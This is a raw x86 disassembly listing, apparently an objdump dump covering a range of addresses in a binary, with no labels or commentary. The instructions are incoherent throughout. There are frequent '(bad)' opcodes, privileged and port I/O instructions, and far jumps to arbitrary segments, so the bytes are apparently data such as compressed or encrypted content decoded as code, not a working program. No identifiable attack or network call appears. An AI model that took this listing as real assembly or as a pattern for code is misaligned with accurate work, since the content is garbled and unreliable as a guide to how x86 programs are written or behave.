  41d83d:	add    edi,DWORD PTR [edx]
  41d83f:	mov    ds:0x76342d25,eax
  41d844:	stos   DWORD PTR es:[edi],eax
  41d845:	les    esp,FWORD PTR [ebx]
  41d847:	xchg   ecx,eax
  41d848:	mov    ebp,0x78271948
  41d84d:	idiv   BYTE PTR es:0x65c7a67c
  41d854:	add    eax,0xaa243cb0
  41d859:	xchg   edi,eax
  41d85a:	outs   dx,BYTE PTR ds:[esi]
  41d85b:	int    0x4f
  41d85d:	cli    
  41d85e:	ja     0x41d8d2
  41d860:	(bad)  
  41d861:	gs pop eax
  41d863:	jb     0x41d8e4
  41d865:	jmp    0x25e2:0x346ff084
  41d86c:	add    al,0x64
  41d86e:	adc    edi,esp
  41d870:	rcr    BYTE PTR [ebx+0x5779f7ce],0x12
  41d877:	loop   0x41d841
  41d879:	push   edi
  41d87a:	sbb    al,0xc8
  41d87c:	rol    DWORD PTR [edi-0x31],cl
  41d87f:	inc    ebx
  41d880:	or     eax,0xc216e2f0
  41d885:	loope  0x41d87f
  41d887:	sub    eax,0xdf70747e
  41d88c:	mul    DWORD PTR [ecx]
  41d88e:	int3   
  41d88f:	xor    eax,0x4e36fd5c
  41d894:	icebp  
  41d895:	and    al,BYTE PTR ds:0x44eb1445
  41d89b:	out    dx,eax
  41d89c:	out    0xcd,eax
  41d89e:	lock test al,al
  41d8a1:	mov    ds:0x2bc6ee16,eax
  41d8a6:	xor    eax,0xc160203e
  41d8ab:	sub    BYTE PTR [eax-0x32],ah
  41d8ae:	dec    eax
  41d8af:	mov    al,0xf4
  41d8b1:	mov    cl,0x92
  41d8b3:	fisttp WORD PTR [edi+0x1f40a2f4]
  41d8b9:	add    BYTE PTR [ebx+0x7976ce0a],dl
  41d8bf:	cmp    eax,0x8f08347f
  41d8c4:	je     0x41d888
  41d8c6:	lahf   
  41d8c7:	(bad)  
  41d8c8:	push   ebx
  41d8c9:	mov    bl,0x5c
  41d8cb:	xchg   edx,eax
  41d8cc:	icebp  
  41d8cd:	dec    edx
  41d8ce:	dec    edi
  41d8cf:	loopne 0x41d888
  41d8d1:	xchg   esi,eax
  41d8d2:	sahf   
  41d8d3:	mov    bl,0xa7
  41d8d5:	cmp    al,0x71
  41d8d7:	fisubr DWORD PTR [eax+eax*2-0x6f]
  41d8db:	loope  0x41d8dc
  41d8dd:	and    al,0x8f
  41d8df:	mov    ecx,0x72beb0e0
  41d8e4:	retf   0x24ca
  41d8e7:	adc    DWORD PTR [ebx],0x218791e4
  41d8ed:	fist   DWORD PTR [ebx]
  41d8ef:	enter  0xa199,0x88
  41d8f3:	push   edx
  41d8f4:	aam    0x5
  41d8f6:	mov    dh,BYTE PTR [ebp-0xcf416f8]
  41d8fc:	mov    BYTE PTR [edx+0x4f],bl
  41d8ff:	fs push ecx
  41d901:	(bad)  
  41d902:	pop    ebp
  41d903:	gs jmp 0x41d90a
  41d906:	fwait
  41d907:	cmp    DWORD PTR [eax+0x5165ca82],esp
  41d90d:	pop    ebx
  41d90e:	cmp    eax,0xd7bc62f6
  41d913:	xor    DWORD PTR [esi+0x59],0x268c6271
  41d91a:	idiv   BYTE PTR [eax+0x7b]
  41d91d:	mov    ebx,0x476d8c29
  41d922:	cs imul esi,DWORD PTR es:0xb77672b5,0x592cf0a1
  41d92e:	(bad)  
  41d930:	int    0xf7
  41d932:	lods   al,BYTE PTR ds:[esi]
  41d933:	sub    BYTE PTR [edx+0x33714609],dl
  41d939:	push   ecx
  41d93a:	xchg   esp,eax
  41d93b:	popa   
  41d93c:	test   eax,0x35e4d624
  41d941:	retf   0x769d
  41d944:	nop
  41d945:	div    BYTE PTR [edx+0x6b]
  41d948:	adc    BYTE PTR [edi],ah
  41d94a:	mov    edx,0x1237b76f
  41d94f:	shr    ch,0x90
  41d952:	jmp    0x41d8fc
  41d954:	mov    WORD PTR [ebx],?
  41d956:	xor    al,0x37
  41d958:	xor    dl,dh
  41d95a:	repz clc 
  41d95c:	cdq    
  41d95d:	out    dx,al
  41d95e:	pop    es
  41d95f:	push   es
  41d960:	inc    edx
  41d961:	rcr    BYTE PTR [edi-0xb],1
  41d964:	retf   
  41d965:	xchg   ecx,eax
  41d966:	leave  
  41d967:	jbe    0x41d8fc
  41d969:	in     al,dx
  41d96a:	push   ss
  41d96b:	add    ch,ah
  41d96d:	repz mov ebx,0xf2147d5c
  41d973:	jmp    0x8bafc64b
  41d978:	into   
  41d979:	call   0xf046683d
  41d97e:	push   esp
  41d97f:	test   DWORD PTR [eax-0x53],esp
  41d982:	mov    al,ds:0xa260cbbc
  41d987:	inc    ecx
  41d988:	jb     0x41d942
  41d98a:	lods   al,BYTE PTR ds:[esi]
  41d98b:	shr    DWORD PTR [edi],1
  41d98d:	fisub  WORD PTR [eax-0x37]
  41d990:	out    dx,eax
  41d991:	jmp    0xc979:0x5bb818f2
  41d998:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d999:	or     al,0x39
  41d99b:	xlat   BYTE PTR ds:[ebx]
  41d99c:	push   edx
  41d99d:	mov    dh,0x29
  41d99f:	out    0x41,al
  41d9a1:	xchg   ebp,eax
  41d9a2:	push   ebx
  41d9a3:	hlt    
  41d9a4:	xchg   ebx,eax
  41d9a5:	dec    esi
  41d9a6:	and    BYTE PTR [eax+edx*4],dl
  41d9a9:	shr    DWORD PTR [edx],1
  41d9ab:	and    BYTE PTR [edx+eax*1+0x23],dh
  41d9af:	xchg   ebp,eax
  41d9b0:	inc    ebp
  41d9b1:	pop    ebx
  41d9b2:	daa    
  41d9b3:	cli    
  41d9b4:	cli    
  41d9b5:	icebp  
  41d9b6:	icebp  
  41d9b7:	inc    edi
  41d9b8:	xor    al,0x70
  41d9ba:	xlat   BYTE PTR ds:[ebx]
  41d9bb:	xchg   ecx,eax
  41d9bc:	dec    ecx
  41d9bd:	sbb    al,0xfc
  41d9bf:	mov    edx,0x6dc223b
  41d9c4:	stos   DWORD PTR es:[edi],eax
  41d9c5:	push   0x6dae462c
  41d9ca:	or     BYTE PTR [esi-0x75],0xd6
  41d9ce:	dec    ecx
  41d9cf:	jbe    0x41d99c
  41d9d1:	mov    ecx,0xddab1617
  41d9d6:	lock imul ebx,DWORD PTR [ecx+0x42],0x4c1add19
  41d9de:	mov    dl,0x65
  41d9e0:	xchg   ebp,eax
  41d9e1:	cmp    ebx,DWORD PTR [ecx+0x62]
  41d9e4:	sub    DWORD PTR [edi+0x6f],esp
  41d9e7:	dec    edi
  41d9e8:	pop    esp
  41d9e9:	push   ebx
  41d9ea:	fiadd  DWORD PTR [eax]
  41d9ec:	push   0xced3079f
  41d9f1:	sbb    eax,0xb5ae1899
  41d9f6:	mov    ds:0xa2f226b1,al
  41d9fb:	jae    0x41da41
  41d9fd:	dec    edi
  41d9fe:	and    BYTE PTR [esp+ecx*4],ah
  41da01:	mov    edi,ss
  41da03:	lahf   
  41da04:	inc    ecx
  41da05:	out    dx,al
  41da06:	inc    ebx
  41da07:	cmp    al,0x24
  41da09:	and    ebx,0x14
  41da0c:	or     dl,0x8b
  41da0f:	dec    esp
  41da10:	mov    ebp,0x478d1983
  41da15:	mov    DWORD PTR [ebp-0x7e],ecx
  41da18:	mov    edi,0x8951e2e5
  41da1d:	nop
  41da1e:	pushf  
  41da1f:	aaa    
  41da20:	xchg   ebx,eax
  41da21:	jg     0x41da19
  41da23:	les    eax,FWORD PTR [ebx-0x80]
  41da26:	ret    0xaadc
  41da29:	lods   eax,DWORD PTR ds:[esi]
  41da2a:	stos   BYTE PTR es:[edi],al
  41da2b:	push   edx
  41da2c:	rcr    DWORD PTR [esi+edi*1+0x61781f7a],cl
  41da33:	sub    ah,BYTE PTR [esi]
  41da35:	xchg   edi,eax
  41da36:	mov    esp,0xf67e0559
  41da3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da3c:	adc    eax,0x7ebebe4e
  41da41:	cmp    al,0x1b
  41da43:	dec    eax
  41da44:	inc    ecx
  41da45:	mov    bl,0x3e
  41da47:	sub    eax,0x9eebdcfc
  41da4c:	jne    0x41daa9
  41da4e:	stc    
  41da4f:	je     0x41da9e
  41da51:	inc    esp
  41da52:	fild   DWORD PTR [edx]
  41da54:	test   DWORD PTR [edi],0x837ca332
  41da5a:	pop    ecx
  41da5b:	aad    0xc3
  41da5d:	fadd   QWORD PTR [edx-0x1f]
  41da60:	dec    esi
  41da61:	aam    0x85
  41da63:	fdecstp 
  41da65:	out    0x61,eax
  41da67:	push   edx
  41da68:	jecxz  0x41da3c
  41da6a:	(bad)  
  41da6b:	(bad)  
  41da6c:	out    dx,al
  41da6d:	out    0x71,al
  41da6f:	and    al,0xcf
  41da71:	loopne 0x41d9ff
  41da73:	mov    ds,WORD PTR [edi+edi*1+0x4]
  41da77:	(bad)  
  41da78:	popf   
  41da79:	add    bh,dl
  41da7b:	mov    dh,0xec
  41da7d:	enter  0x7edc,0xa8
  41da81:	cmp    al,0x5b
  41da83:	rcl    BYTE PTR [eax+0x792ff987],1
  41da89:	cmp    edx,DWORD PTR [edx+0x7d28efa0]
  41da8f:	or     eax,0x27c92e26
  41da94:	neg    dl
  41da96:	test   BYTE PTR [esi],dh
  41da98:	icebp  
  41da99:	xchg   DWORD PTR [edx-0xc],edi
  41da9c:	xchg   edx,eax
  41da9d:	xchg   edx,eax
  41da9e:	adc    edi,edi
  41daa0:	dec    esi
  41daa1:	cmp    eax,0x9b1b4c25
  41daa6:	xchg   esp,eax
  41daa7:	scas   al,BYTE PTR es:[edi]
  41daa8:	pop    ebp
  41daa9:	shl    DWORD PTR ds:0xbe2c5f7b,1
  41daaf:	inc    ebp
  41dab0:	inc    eax
  41dab1:	pop    ds
  41dab2:	daa    
  41dab3:	push   edx
  41dab4:	and    al,0x90
  41dab6:	sub    ecx,DWORD PTR [ecx+0x13]
  41dab9:	(bad)  
  41daba:	bnd ret 
  41dabc:	lods   eax,DWORD PTR ds:[esi]
  41dabd:	into   
  41dabe:	jmp    0x41db3b
  41dac0:	adc    ebx,0x2d
  41dac3:	jne    0x41da9f
  41dac5:	pop    ebx
  41dac6:	add    cl,cl
  41dac8:	outs   dx,BYTE PTR ds:[esi]
  41dac9:	jne    0x41db05
  41dacb:	popf   
  41dacc:	mov    dh,0x5c
  41dace:	inc    esp
  41dacf:	not    DWORD PTR [edx-0x572924a8]
  41dad5:	sbb    BYTE PTR [ebp+edi*8+0x70],ah
  41dad9:	push   cs
  41dada:	rol    DWORD PTR [eax+0x216113cd],1
  41dae0:	stc    
  41dae1:	xchg   esi,eax
  41dae2:	add    DWORD PTR ds:0x881f33e1,ebx
  41dae8:	xchg   ebp,eax
  41dae9:	repnz cmp ebx,ebp
  41daec:	test   BYTE PTR [bx+0x12],ah
  41daf0:	xchg   ebp,eax
  41daf1:	imul   ecx,DWORD PTR [edi+0x32],0xffffff83
  41daf5:	xchg   ebp,eax
  41daf6:	(bad)  
  41daf7:	retf   0x3b00
  41dafa:	push   ss
  41dafb:	mov    edi,0xf45b6323
  41db00:	add    DWORD PTR [ecx-0x2d833652],edi
  41db06:	mov    esp,0x6915b9fa
  41db0b:	jle    0x41daaa
  41db0d:	dec    ecx
  41db0e:	jmp    0x41db73
  41db10:	adc    BYTE PTR [eax-0x59c380f5],bh
  41db16:	adc    DWORD PTR [ebp+0x65],ebp
  41db19:	(bad)  
  41db1a:	sti    
  41db1b:	jecxz  0x41db44
  41db1d:	stc    
  41db1e:	rcl    DWORD PTR ds:[edx+esi*2],1
  41db22:	cld    
  41db23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db24:	add    eax,0x9d9ac2fa
  41db29:	(bad)  
  41db2a:	xchg   ebx,eax
  41db2b:	fisubr WORD PTR [edx-0x506acfad]
  41db31:	push   es
  41db32:	gs xor al,0x1
  41db35:	in     eax,dx
  41db36:	es fsubp st(5),st
  41db39:	inc    ebp
  41db3a:	and    esi,ebx
  41db3c:	inc    edi
  41db3d:	dec    ebx
  41db3e:	push   esp
  41db3f:	push   0x74239f39
  41db44:	pop    esp
  41db45:	adc    al,0xdd
  41db47:	jle    0x41dbc3
  41db49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db4a:	pop    edx
  41db4b:	dec    esp
  41db4c:	cs jae 0x41db97
  41db4f:	mov    edi,0xc9cf0c3b
  41db54:	pop    DWORD PTR [ebp-0x7fe57a35]
  41db5a:	dec    esi
  41db5b:	(bad)  
  41db5c:	push   edx
  41db5d:	test   al,0x27
  41db5f:	jmp    0x41db9d
  41db61:	fisttp DWORD PTR ds:0x99ca9694
  41db67:	pusha  
  41db68:	cmp    eax,0xb926bc5
  41db6d:	retf   
  41db6e:	push   edi
  41db6f:	icebp  
  41db70:	ror    BYTE PTR [ebx+edi*8],0x7f
  41db74:	or     cl,BYTE PTR [ebp+eax*4+0x8]
  41db78:	stos   BYTE PTR es:[edi],al
  41db79:	push   esp
  41db7a:	lock pop ebx
  41db7c:	fcom   QWORD PTR [eax+0x52da75d1]
  41db82:	dec    esi
  41db83:	push   es
  41db84:	sbb    eax,0xd1aea0cf
  41db89:	xchg   ebp,eax
  41db8a:	gs jns 0x41db32
  41db8d:	add    eax,0x42490a45
  41db92:	mov    ecx,0xf0042d0
  41db97:	adc    DWORD PTR [ebx+0x4ed2218f],ebp
  41db9d:	push   ecx
  41db9e:	jnp    0x41db5f
  41dba0:	pop    edi
  41dba1:	mov    WORD PTR [ebx+0x16],ss
  41dba4:	mov    ebx,0x6b89f300
  41dba9:	and    BYTE PTR [edx-0x6b3a27fe],0x8b
  41dbb0:	sbb    dl,BYTE PTR [edx]
  41dbb2:	sbb    DWORD PTR [esi],ecx
  41dbb4:	(bad)  
  41dbb5:	sbb    eax,0x376818ee
  41dbba:	sbb    bl,BYTE PTR [eax-0x3e29d922]
  41dbc0:	in     al,dx
  41dbc1:	popf   
  41dbc2:	mov    ebp,0x8e391336
  41dbc7:	enter  0x3336,0xd0
  41dbcb:	popa   
  41dbcc:	mov    ds:0x23f7c4b1,al
  41dbd1:	or     al,0x3f
  41dbd3:	adc    DWORD PTR [ecx+0x5a],edi
  41dbd6:	lahf   
  41dbd7:	stos   DWORD PTR es:[edi],eax
  41dbd8:	ret    0xcf3c
  41dbdb:	aad    0x8c
  41dbdd:	mov    ah,0xf9
  41dbdf:	dec    ecx
  41dbe0:	sbb    al,dh
  41dbe2:	sbb    DWORD PTR [eax],eax
  41dbe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbe5:	mov    dh,0xac
  41dbe7:	(bad)  
  41dbe8:	and    dh,ah
  41dbea:	mul    DWORD PTR [eax]
  41dbec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbed:	fneni(8087 only) 
  41dbef:	outs   dx,BYTE PTR ds:[esi]
  41dbf0:	hlt    
  41dbf1:	cmp    DWORD PTR [ebx],ecx
  41dbf3:	cmp    eax,0x90858ef6
  41dbf8:	push   edi
  41dbf9:	mov    dh,bh
  41dbfb:	rcl    DWORD PTR [edx],1
  41dbfd:	out    dx,eax
  41dbfe:	ins    DWORD PTR es:[edi],dx
  41dbff:	cld    
  41dc00:	push   ds
  41dc01:	rcl    BYTE PTR [ecx-0x7b],0x90
  41dc05:	loopne 0x41dc3c
  41dc07:	mov    edi,0x8ed3032a
  41dc0c:	pop    eax
  41dc0d:	cmc    
  41dc0e:	(bad)  
  41dc0f:	cs in  al,dx
  41dc11:	and    bh,BYTE PTR [ecx+0x11]
  41dc14:	sub    ebx,DWORD PTR [ebp+0x78c31c1]
  41dc1a:	fwait
  41dc1b:	pusha  
  41dc1c:	xchg   ebx,eax
  41dc1d:	inc    ebx
  41dc1e:	sahf   
  41dc1f:	cmp    al,0x55
  41dc21:	repnz sub esp,edx
  41dc24:	cli    
  41dc25:	idiv   DWORD PTR [edi+0x1de4ea16]
  41dc2b:	or     BYTE PTR [eax],0xe4
  41dc2e:	out    0x4d,al
  41dc30:	pushf  
  41dc31:	stos   DWORD PTR es:[edi],eax
  41dc32:	fwait
  41dc33:	(bad)  
  41dc34:	fdiv   DWORD PTR [eax]
  41dc36:	jle    0x41dc9d
  41dc38:	inc    ebp
  41dc39:	aaa    
  41dc3a:	adc    esi,DWORD PTR [esi+ecx*1+0x4d]
  41dc3e:	int    0xba
  41dc40:	jbe    0x41dc20
  41dc42:	sbb    ebp,DWORD PTR [eax+0x3fe04f28]
  41dc48:	jmp    FWORD PTR [ecx+0x68]
  41dc4b:	xchg   ebx,eax
  41dc4c:	jmp    0xc27678af
  41dc51:	add    al,0xf1
  41dc53:	push   ds
  41dc54:	ror    dl,cl
  41dc56:	xor    al,cl
  41dc58:	push   0x914a131c
  41dc5d:	dec    ebp
  41dc5e:	add    BYTE PTR [edx+0x65],bh
  41dc61:	sbb    esi,DWORD PTR [eax+ecx*4]
  41dc64:	or     al,0xe4
  41dc66:	xor    al,0x7a
  41dc68:	jg     0x41dbf9
  41dc6a:	sbb    dl,BYTE PTR [ecx-0x6da14798]
  41dc70:	loope  0x41dc8e
  41dc72:	xor    al,0x6e
  41dc74:	sbb    BYTE PTR [esp+edi*1],al
  41dc77:	push   edi
  41dc78:	pop    eax
  41dc79:	frstor [esi-0x3148a692]
  41dc7f:	fisubr WORD PTR ds:0xe3bf5d6c
  41dc85:	pop    ecx
  41dc86:	pop    edx
  41dc87:	mov    edx,0xabddefd
  41dc8c:	sub    esi,DWORD PTR [ecx]
  41dc8e:	mov    DWORD PTR [esi+0x56dc0312],ecx
  41dc94:	shl    DWORD PTR [ebp+0x1c],0x93
  41dc98:	push   esp
  41dc99:	xchg   esp,eax
  41dc9a:	inc    ebp
  41dc9b:	lds    esp,FWORD PTR [edi-0x4e]
  41dc9e:	out    dx,eax
  41dc9f:	xor    DWORD PTR [esi],edx
  41dca1:	mov    al,ds:0x1bf620eb
  41dca6:	mov    al,ds:0xae3a8df7
  41dcab:	gs cli 
  41dcad:	cli    
  41dcae:	nop
  41dcaf:	(bad)  
  41dcb0:	popa   
  41dcb1:	add    eax,0x315b8d
  41dcb6:	fs push edx
  41dcb8:	mov    ebp,0xac84f57
  41dcbd:	out    dx,al
  41dcbe:	fsubp  st(4),st
  41dcc0:	sub    dl,BYTE PTR [edi+0x1b]
  41dcc3:	cmp    BYTE PTR [esi],0x37
  41dcc6:	lea    ecx,[edi]
  41dcc8:	and    DWORD PTR [ebx+0x3a30811c],0x77
  41dccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcd0:	ins    DWORD PTR es:[edi],dx
  41dcd1:	retf   0x3a59
  41dcd4:	jo     0x41dcc6
  41dcd6:	cmp    esp,esp
  41dcd8:	mov    ebx,0xde0e2dc3
  41dcdd:	lods   eax,DWORD PTR ds:[esi]
  41dcde:	cmp    DWORD PTR ds:0x21fc8bc7,0xffffffd6
  41dce5:	push   esi
  41dce6:	mov    BYTE PTR [edx+0x5f],bl
  41dce9:	jns    0x41dd3f
  41dceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcec:	pop    esi
  41dced:	pop    edx
  41dcee:	retf   0x2c7f
  41dcf1:	les    edx,FWORD PTR [bx+0x2c]
  41dcf5:	out    dx,al
  41dcf6:	and    BYTE PTR [ebx],cl
  41dcf8:	lds    ebp,FWORD PTR [esp+eax*1]
  41dcfb:	out    dx,eax
  41dcfc:	xor    bl,al
  41dcfe:	loop   0x41dd7e
  41dd00:	mov    BYTE PTR [ebp-0x2c],cl
  41dd03:	jo     0x41dcbc
  41dd05:	repz shr DWORD PTR [edx+eax*2-0x80],cl
  41dd0a:	sub    edx,esp
  41dd0c:	stc    
  41dd0d:	mov    dh,0x6b
  41dd0f:	xor    DWORD PTR [eax-0x71],edx
  41dd12:	jge    0x41dcef
  41dd14:	(bad)  
  41dd15:	jmp    0x6c87:0xad0cde84
  41dd1c:	mov    eax,ds:0x22748ea3
  41dd21:	xchg   ebp,eax
  41dd22:	xchg   edx,eax
  41dd23:	sbb    eax,DWORD PTR [edi+0x56]
  41dd26:	inc    ebp
  41dd27:	shl    DWORD PTR [ecx-0x6],0x86
  41dd2b:	jle    0x41dd33
  41dd2d:	cdq    
  41dd2e:	clc    
  41dd2f:	dec    edx
  41dd30:	les    esi,FWORD PTR [eax+ecx*4-0x21c6672d]
  41dd37:	adc    ecx,edi
  41dd39:	imul   BYTE PTR [eax+eax*8+0x25224b71]
  41dd40:	xor    al,0xb7
  41dd42:	mov    ch,0xc2
  41dd44:	push   0xffffffae
  41dd46:	scas   eax,DWORD PTR es:[edi]
  41dd47:	dec    eax
  41dd48:	dec    ecx
  41dd49:	xor    eax,0x2e8f9ccf
  41dd4e:	hlt    
  41dd4f:	dec    ecx
  41dd50:	push   edi
  41dd51:	(bad)  
  41dd52:	inc    DWORD PTR [ebx+ebp*2]
  41dd55:	mov    esi,0xe508ec13
  41dd5a:	das    
  41dd5b:	and    al,0x92
  41dd5d:	and    edi,DWORD PTR [edx+0x530b12a]
  41dd63:	inc    ebx
  41dd64:	retf   
  41dd65:	pmovmskb eax,mm5
  41dd68:	in     eax,0x3e
  41dd6a:	fs inc esp
  41dd6c:	pop    ebx
  41dd6d:	pop    ds
  41dd6e:	js     0x41dd39
  41dd70:	jns    0x41dd6d
  41dd72:	cmp    al,0xfb
  41dd74:	dec    edx
  41dd75:	sub    edi,eax
  41dd77:	sub    ah,BYTE PTR [eax-0x7f]
  41dd7a:	sub    al,0xb6
  41dd7c:	or     DWORD PTR [edx+0x20f8669d],0x74
  41dd83:	sub    al,0xa9
  41dd85:	jl     0x41dd7c
  41dd87:	jl     0x41ddd5
  41dd89:	fisub  DWORD PTR [eax*8-0x31b26ae6]
  41dd90:	ins    BYTE PTR es:[edi],dx
  41dd91:	loope  0x41dd59
  41dd93:	sub    eax,0x6f82727e
  41dd98:	loop   0x41ddc3
  41dd9a:	xchg   esi,eax
  41dd9b:	mov    ah,0x65
  41dd9d:	sbb    DWORD PTR [ebx],0xffffffd4
  41dda0:	fld    DWORD PTR [ebx+0x30]
  41dda3:	jno    0x41dd67
  41dda5:	add    eax,0x33a39f00
  41ddab:	pop    ecx
  41ddac:	sub    ecx,esi
  41ddae:	in     al,0x5b
  41ddb0:	add    BYTE PTR ds:[eax+0x199e19a3],ch
  41ddb7:	dec    ebx
  41ddb8:	jns    0x41dd81
  41ddba:	imul   edx,DWORD PTR [eax+0x6a],0xc2c44d42
  41ddc1:	adc    bl,BYTE PTR [ebp-0x6df3dc8e]
  41ddc7:	xchg   ecx,eax
  41ddc8:	js     0x41de21
  41ddca:	loop   0x41dd68
  41ddcc:	in     al,0x78
  41ddce:	out    dx,al
  41ddcf:	adc    eax,0x771f40ea
  41ddd4:	rcr    BYTE PTR [eax+0x31],cl
  41ddd7:	aaa    
  41ddd8:	mov    bh,0x76
  41ddda:	mov    ebp,0x289ecd2a
  41dddf:	fimul  WORD PTR [ebx+edx*8-0x7fd0c02b]
  41dde6:	cs into 
  41dde8:	lea    ebx,[ecx-0x24]
  41ddeb:	and    al,0xcc
  41dded:	cwde   
  41ddee:	or     dh,BYTE PTR [esi+0x17]
  41ddf1:	cli    
  41ddf2:	adc    cl,BYTE PTR [edx+0xc]
  41ddf5:	push   eax
  41ddf6:	pop    ss
  41ddf7:	mov    WORD PTR [esi],es
  41ddf9:	stc    
  41ddfa:	cmc    
  41ddfb:	addr16 pop esi
  41ddfd:	(bad)  
  41ddfe:	sub    ebp,DWORD PTR [esi]
  41de00:	pop    eax
  41de01:	es cmp ah,bl
  41de04:	shl    BYTE PTR [ecx-0x615fc408],0x38
  41de0b:	in     al,0xc2
  41de0d:	das    
  41de0e:	mov    eax,ds:0xa11a4a3b
  41de13:	cdq    
  41de14:	add    BYTE PTR [ebx],bl
  41de16:	cli    
  41de17:	scas   eax,DWORD PTR es:[edi]
  41de18:	and    ecx,DWORD PTR [edx-0x1d14b6c]
  41de1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de1f:	loope  0x41ddd2
  41de21:	out    dx,eax
  41de22:	in     al,dx
  41de23:	and    BYTE PTR ds:[edx],0xc5
  41de27:	mov    ecx,0x7d2dd6a2
  41de2c:	xchg   ebp,eax
  41de2d:	cdq    
  41de2e:	into   
  41de2f:	mov    cs,WORD PTR [ebx+edi*8-0x4ca46673]
  41de36:	sbb    al,0x2
  41de38:	pop    ecx
  41de39:	sar    DWORD PTR ds:[esi+0x7],cl
  41de3d:	pop    ecx
  41de3e:	mov    dh,BYTE PTR [edx+0x6f]
  41de41:	call   0x11b78e9a
  41de46:	sub    BYTE PTR [esp+ecx*8+0x56],bl
  41de4a:	mov    ebx,edi
  41de4c:	popf   
  41de4d:	push   esp
  41de4e:	ret    0xf40e
  41de51:	jae    0x41deb5
  41de53:	popf   
  41de54:	rcr    BYTE PTR [ecx+ebx*1+0x33],1
  41de58:	call   0x6965e61b
  41de5d:	cmp    BYTE PTR gs:[esi],al
  41de60:	cmc    
  41de61:	mov    edi,0x6107bac4
  41de66:	and    DWORD PTR [eax+ebp*2-0x68],eax
  41de6a:	xchg   ecx,eax
  41de6b:	or     ebp,edi
  41de6d:	lea    esp,[eax+ebx*2-0x5978110f]
  41de74:	gs call 0x9f06bdf8
  41de7a:	push   esi
  41de7b:	in     eax,dx
  41de7c:	push   ss
  41de7d:	outs   dx,DWORD PTR ds:[esi]
  41de7e:	jl     0x41dea0
  41de80:	xchg   ch,ch
  41de82:	popf   
  41de83:	mov    bh,BYTE PTR [ecx]
  41de85:	mov    dl,0xf2
  41de87:	jp     0x41de31
  41de89:	je     0x41de18
  41de8b:	pop    ebx
  41de8c:	rcr    al,cl
  41de8e:	scas   al,BYTE PTR es:[edi]
  41de8f:	xchg   edi,edx
  41de91:	imul   edx,DWORD PTR [ecx+0x57],0xd
  41de95:	or     al,0x5f
  41de97:	or     DWORD PTR [edi-0x1d620d5d],eax
  41de9d:	xchg   ebx,eax
  41de9e:	repz xchg ebp,eax
  41dea0:	outs   dx,BYTE PTR ds:[esi]
  41dea1:	add    al,bl
  41dea3:	jp     0x41df02
  41dea5:	imul   edx,DWORD PTR [eax],0xffffffc6
  41dea8:	icebp  
  41dea9:	adc    al,BYTE PTR [edi-0x4d]
  41deac:	and    DWORD PTR [eax],ebx
  41deae:	jbe    0x41deab
  41deb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41deb1:	call   0x38a0:0xeb5a3fee
  41deb8:	into   
  41deb9:	fsubr  DWORD PTR [ebx]
  41debb:	jne    0x41de44
  41debd:	aas    
  41debe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41debf:	or     al,0xa3
  41dec1:	test   eax,0xada96cf5
  41dec6:	jle    0x41df45
  41dec8:	sub    DWORD PTR ds:0x573b18e9,eax
  41dece:	dec    edi
  41decf:	ds popf 
  41ded1:	jl     0x41decb
  41ded3:	stc    
  41ded4:	or     DWORD PTR [ebx-0x76e34a06],ebp
  41deda:	dec    edx
  41dedb:	pop    es
  41dedc:	mov    cl,0xa4
  41dede:	mov    edi,0xb1e3e10a
  41dee3:	repz sbb edx,DWORD PTR [edx+0x7396f659]
  41deea:	add    eax,0x461730cc
  41deef:	sbb    eax,0x57289509
  41def4:	inc    BYTE PTR [edx-0x31]
  41def7:	test   BYTE PTR [edi-0x27],ah
  41defa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41defb:	pop    edi
  41defc:	sar    ah,cl
  41defe:	inc    edx
  41deff:	push   esi
  41df00:	cdq    
  41df01:	sbb    eax,0xee0099
  41df06:	add    eax,0x9705a06f
  41df0b:	mov    edi,esp
  41df0d:	inc    edi
  41df0e:	sub    eax,0x3a28e60c
  41df13:	scas   eax,DWORD PTR es:[edi]
  41df14:	pop    es
  41df15:	mov    eax,ds:0xd26c5cd2
  41df1a:	neg    BYTE PTR [ebx+ecx*2-0x5]
  41df1e:	xlat   BYTE PTR ds:[ebx]
  41df1f:	das    
  41df20:	dec    esi
  41df21:	mov    ch,0x77
  41df23:	je     0x41df9e
  41df25:	bound  ecx,QWORD PTR ss:0x7bf7eb5d
  41df2c:	add    ah,BYTE PTR [ebx-0x6d]
  41df2f:	push   es
  41df30:	jge    0x41df2f
  41df32:	push   0xabcb77b5
  41df37:	push   ecx
  41df38:	test   dh,ah
  41df3a:	adc    dh,BYTE PTR [edi+edx*1]
  41df3d:	test   eax,0x78186710
  41df42:	les    eax,FWORD PTR ds:0xea63d9de
  41df48:	dec    eax
  41df49:	push   ebx
  41df4a:	inc    ebx
  41df4b:	jae    0x41ded6
  41df4d:	cmp    BYTE PTR [eax],cl
  41df4f:	shl    BYTE PTR [ebx+0x680e0cfe],cl
  41df55:	lea    ebx,gs:[edi-0x75]
  41df59:	int3   
  41df5a:	sbb    BYTE PTR [edi-0x1310961e],cl
  41df60:	pop    esi
  41df61:	push   ds
  41df62:	xchg   edx,eax
  41df63:	repnz rol DWORD PTR [ebx+ebp*8-0x43],cl
  41df68:	adc    ah,BYTE PTR ds:0x2d6f8853
  41df6e:	sub    al,0x3a
  41df70:	or     edi,edi
  41df72:	jno    0x41df1e
  41df74:	(bad)  [ecx+esi*1+0x6]
  41df78:	pop    ss
  41df79:	sub    al,0x83
  41df7b:	adc    eax,0xddc03356
  41df80:	dec    ecx
  41df81:	sbb    bl,BYTE PTR [eax+0x2b]
  41df84:	in     eax,0x29
  41df86:	mov    edx,0x46792102
  41df8b:	gs daa 
  41df8d:	iret   
  41df8e:	repz mov ah,0x79
  41df91:	dec    ebp
  41df92:	icebp  
  41df93:	cmc    
  41df94:	loopne 0x41dfb2
  41df96:	fild   DWORD PTR [esp+ebp*2-0x80]
  41df9a:	loopne 0x41dfd5
  41df9c:	inc    ebp
  41df9d:	dec    ebx
  41df9e:	nop
